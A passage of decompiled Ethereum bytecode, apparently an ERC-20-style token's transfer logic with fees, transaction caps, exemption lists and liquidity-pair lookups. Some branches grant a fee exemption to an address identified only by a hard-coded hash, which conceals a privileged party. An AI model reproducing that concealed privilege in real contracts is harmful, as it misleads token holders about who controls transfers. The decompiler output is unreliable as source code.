                                    _7818 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7818 + 32 len mem[_7818]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7452):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7852 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7852 + 32 len mem[_7852]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 3
                require balanceOf[address(msg.sender)] >= arg2
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor14:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor6[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor6[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor14:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
